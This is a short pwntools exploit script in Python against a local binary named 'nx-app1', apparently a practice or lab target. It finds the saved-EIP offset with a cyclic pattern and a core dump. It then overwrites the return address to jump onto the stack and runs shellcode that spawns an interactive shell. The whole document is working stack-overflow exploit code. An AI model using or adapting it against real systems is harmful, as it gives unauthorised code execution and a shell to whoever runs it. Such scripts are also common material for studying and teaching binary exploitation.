#!/bin/python3

from pwn import *

app_path = "./nx-app1"

pty = process.PTY
elf = ELF(app_path)
io = process(elf.path, stdin=pty, stdout=pty)
io.clean()
io.sendline(cyclic(100, n=4))
io.wait()
core = io.corefile
info("eip = %#x", core.eip)
eip_offset = cyclic_find(pack(core.eip))
info("eip offset = %d", eip_offset)
io.clean()


p = process(app_path)

gdb.attach(p)

p.readuntil("Please enter your name: \n")
payload = b"a"*eip_offset
payload += pack(core.esp + 32)
payload += asm(shellcraft.sh())
p.sendline(payload)
p.interactive()
